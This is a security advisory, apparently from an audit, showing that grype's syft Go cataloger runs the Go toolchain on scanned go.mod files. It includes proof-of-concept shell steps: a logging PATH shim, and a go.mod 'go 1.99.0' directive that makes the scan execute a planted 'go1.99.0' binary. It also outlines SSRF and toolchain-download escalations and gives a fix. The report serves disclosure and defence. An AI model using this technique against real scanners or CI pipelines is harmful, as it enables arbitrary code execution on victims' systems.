# Security finding: grype executes the Go toolchain while scanning, enabling arbitrary command execution

- **Component:** syft Go-module cataloger used by grype during directory/image scanning
  (`syft/pkg/cataloger/golang`, `UsePackagesLib` → `golang.org/x/tools/go/packages`)
- **Class:** CWE-78 / CWE-829 — execution of an external program / inclusion of functionality
  from an untrusted control sphere, triggered purely by parsing an attacker-authored file.
- **Impact:** Scanning a directory that contains an attacker-authored `go.mod` makes grype —
  **default configuration, no flags, no git or config changes** — spawn the real `go` toolchain
  with its working directory set to the attacker's directory. Via Go's `toolchain`/`go`
  version directive this escalates to **arbitrary local command execution** (a `goX.Y.Z` binary
  is executed from `PATH`), plus SSRF / VCS-exec / toolchain-download / DoS.
- **Attacker input:** a `go.mod` file anywhere in the scanned tree (`**/go.mod`). Normal usage
  (`grype dir:<path>`, `grype <path>`, CI scanning a checked-out repo) is enough.
- **Status:** unfixed. Analysis, working PoCs (marker files created by grype's own scan), and a
  fix prototype below.

---

## 1. Summary

grype catalogs directories/images with syft. Syft's Go-module cataloger defaults to
`UsePackagesLib: true`, whose own config comment states it *"executes golang tooling found on
the path in addition to potential network access."* When grype scans a tree containing a
`go.mod` (glob `**/go.mod`), the cataloger calls `golang.org/x/tools/go/packages`
`packages.Load(cfg, "all")` with `Dir` = the module directory, which shells out to the `go`
binary. A vulnerability scanner running a network- and subprocess-capable build tool against
**untrusted code** is the core defect.

**This is the only ecosystem in grype that executes anything at parse time** (see §5): every
other artifact parser is static.

## 2. Root cause

`syft/pkg/cataloger/golang/config.go` — default ON:

```go
func DefaultCatalogerConfig() CatalogerConfig {
    return CatalogerConfig{
        UsePackagesLib:    true,   // <-- default
        MainModuleVersion: DefaultMainModuleVersionConfig(),
    }
}
```

`syft/pkg/cataloger/golang/cataloger.go` — trigger glob:

```go
WithParserByGlobs(newGoModCataloger(opts).parseGoModFile, "**/go.mod")
```

`syft/pkg/cataloger/golang/parse_go_mod.go` — the sink:

```go
if c.usePackagesLib {
    sourcePackages, sourceModules, sourceDependencies, err = c.loadPackages(modDir, ...)
}

func (c *goModCataloger) loadPackages(modDir string, ...) (...) {
    cfg := &packages.Config{
        Mode: NeedModule | NeedName | NeedFiles | NeedDeps | NeedImports,
        Dir:  modDir,                          // attacker-controlled directory
        Env:  append(os.Environ(), "GOWORK=off"),
    }
    rootPkgs, err := packages.Load(cfg, "all")  // executes the `go` binary
}
```

## 3. PoC #1 — grype runs `go` on the file (default, no config, no GOFLAGS)

Malicious artifact = a directory containing a `go.mod`. Put a `go` shim first on `PATH` as the
"an external program ran" oracle (it writes a marker, then delegates so the scan still works):

```sh
# shim/go
#!/bin/sh
echo "GO EXECUTED args=[$*] cwd=[$(pwd)]" >> /tmp/go_invoked.log
exec /usr/local/go/bin/go "$@"
```

```sh
mkdir scan && printf 'module e/x\ngo 1.21\n' > scan/go.mod
PATH="$PWD/shim:$PATH" grype dir:./scan -q
```

Observed (verbatim, stock grype build, default env):

```
GO EXECUTED args=[list -e -f {{context.ReleaseTags}} -- unsafe]                       cwd=[.../scan]
GO EXECUTED args=[list -e -json=... -compiled=false -deps=true -find=false ... -- all] cwd=[.../scan]
```

The `go` toolchain was executed, in the attacker's directory, purely because a `go.mod` was
present — no config, no flags, no git changes.

## 4. PoC #2 — arbitrary local command execution via the toolchain directive

Go 1.21+ toolchain management: if a `go.mod` names a Go/`toolchain` version higher than the
running toolchain, `go` resolves and **executes** a toolchain binary named `goX.Y.Z`, looked up
on `PATH` (before/instead of downloading, under the default `GOTOOLCHAIN=auto`).

Malicious `go.mod` (two lines is enough — no explicit `toolchain` line required):

```
module e/x
go 1.99.0
```

With a same-named executable reachable on `PATH` (the arbitrary payload):

```sh
# an attacker-provided binary named exactly like the requested toolchain
printf '#!/bin/sh\ntouch /tmp/pwned_toolchain\n' > bindir/go1.99.0 && chmod +x bindir/go1.99.0
PATH="$PWD/bindir:$PATH" grype dir:./scan-bare -q
# => /tmp/pwned_toolchain is created: grype executed the attacker binary
```

**Verified** (both a `toolchain go1.99.99` directive and a bare `go 1.99.0` directive) under
**default `GOTOOLCHAIN=auto`, no GOFLAGS, no network, no cgo, no git**: grype's scan executed
the attacker's `goX.Y.Z` from `PATH` and created the marker. It also fires under
`GOTOOLCHAIN=path` (a setting some CI uses as "hardening").

### Exploitation precondition and reach

`go` resolves the toolchain via `PATH` (verified: a `goX.Y.Z` placed only inside the scanned
directory or CWD is **not** used — Go uses `exec.LookPath`). So arbitrary command execution
requires the attacker's `goX.Y.Z` to be reachable on the victim's `PATH`. That is commonly
satisfied and often attacker-influenceable:

- `~/go/bin` (`GOBIN`/`GOPATH/bin`) is on `PATH` in essentially every Go dev/CI environment and
  is user-writable — any prior low-value write primitive (or a second malicious module the
  victim `go install`ed) lands the payload.
- CI runners frequently place the workspace, `./bin`, `node_modules/.bin`, or `.` on `PATH`.
- `GOTOOLCHAIN=path` deployments execute a `PATH` toolchain by design.

Even where `PATH` is not attacker-writable, the **base primitive (PoC #1) always holds** and
the directive escalates to: **toolchain download+execution** from `GOPROXY` (network code
fetched and run, chosen by the file), **SSRF** to attacker module hosts, **VCS subprocess
execution** (`git`/`hg`) via the `direct` fallback, and **DoS** via unbounded module/toolchain
resolution.

### Escalations that did NOT fire on a stock sandbox (tested, for honesty)

- **cgo compiler hijack** (`#cgo CFLAGS: -B<dir>` / direct `cc` probe): grype's `go list` runs
  `-compiled=false`, so the C toolchain is never invoked — verified with `cc`/`gcc`/`clang` and
  `as`/`cc1`/`cpp` shims (no marker).
- **`replace golang.org/toolchain => ./local`** and **dir-local/CWD `goX.Y.Z`**: not used (Go
  switches toolchain before module replaces and resolves the toolchain via `PATH` only).
- **Network fetch of a `require`/higher toolchain**: gated in the sandbox (no reachable Go
  proxy; the tested toolchain version was not higher than installed). Reachable where the proxy
  is reachable and the named version is higher/existing.

## 5. Ecosystem survey — is anything else exploitable this way? (No)

Empirically scanned one directory containing 18 crafted files across ~15 ecosystems (Go, npm,
Python, Ruby, PHP, Rust, Java, .NET, apk, dpkg, Dart, Elixir, GitHub Actions, Terraform) with a
55-tool `PATH` shim set (`git hg svn bzr gcc cc clang as ld tar unzip unpigz zstd xz dpkg rpm ar
sh bash python ruby gem bundle node npm mvn java dotnet cargo nix pkg-config …`). Result:

- **Only `go` was executed.** No other tool fired.
- The npm `preinstall` script, the Ruby `.gemspec` backtick, and `setup.py`'s `os.system` were
  **not** evaluated (parsed statically). Static confirmation: of syft's ~40 catalogers, only
  `golang` imports `os/exec`/`go/packages` at runtime.

So the parse-time execution vector is **Go-specific**; all other artifact types are static
parsers. (Grype's *other* code-execution exposure is on the DB-update path, documented
separately in `2026-07-config-injection-go-getter-rce.md`.)

## 6. Fix prototype (documentation only — not applied as code)

The root fix is to never run the Go toolchain on untrusted input. Grype already receives fully
static `go.mod` parsing as the base case; only the opt-in `UsePackagesLib` deep analysis shells
out. Grype constructs the syft config in `cmd/grype/cli/commands/root.go:getProviderConfig`, so
the change is one line there:

```go
// cmd/grype/cli/commands/root.go
func getProviderConfig(opts *options.Grype) pkg.ProviderConfig {
    cfg := syft.DefaultCreateSBOMConfig()
    cfg.Packages.JavaArchive.IncludeIndexedArchives = opts.Search.IncludeIndexedArchives
    cfg.Packages.JavaArchive.IncludeUnindexedArchives = opts.Search.IncludeUnindexedArchives

+   // Do not execute the Go toolchain (`go list`) on untrusted scan targets. `go/packages`
+   // shells out to `go`, which — via a go.mod `go`/`toolchain` directive — will execute a
+   // `goX.Y.Z` binary from PATH and can download+run a toolchain / spawn VCS tools / reach the
+   // network. Static go.mod parsing (the base path) is sufficient for vulnerability matching.
+   cfg.Packages.Golang.UsePackagesLib = false

    cfg.Compliance.MissingVersion = cataloging.ComplianceActionDrop
    // ...
}
```

Field path verified against syft v1.42.3 (`pkgcataloging.Config.Golang golang.CatalogerConfig`,
which has `UsePackagesLib bool`). Grype could additionally expose this as an explicit,
default-false option (e.g. `golang.deep-source-analysis`) so users who opt in are warned it is
unsafe for untrusted targets.

Defense in depth if deep analysis must remain available: sandbox the `go` subprocess —
`GOTOOLCHAIN=local`, `GOFLAGS=-mod=readonly`, `GOPROXY=off`, `GONOSUMCHECK` unset,
`GIT_ALLOW_PROTOCOL=` empty, no network, a scratch `GOMODCACHE`/`GOPATH`, and (ideally) a
restricted `PATH` — so `go list` cannot switch toolchains, download modules, spawn VCS tools, or
reach the network.

## 7. Relationship to the other findings on this branch

This is the "deeper / easier" file-parse-triggered execution: it needs **no configuration
change and no git tricks**, only a `go.mod` in the scanned tree, and fires during ordinary
cataloging. It is distinct from the go-getter DB-update config-injection finding
(`2026-07-config-injection-go-getter-rce.md`) and from the two version/distro DoS findings
(`2026-07-distro-version-parse-panic.md`, `2026-07-version-comparator-cache-panic.md`). See
`REPORT-2026-07-pre-match-dos-findings.md` for the DoS write-ups and the index below.
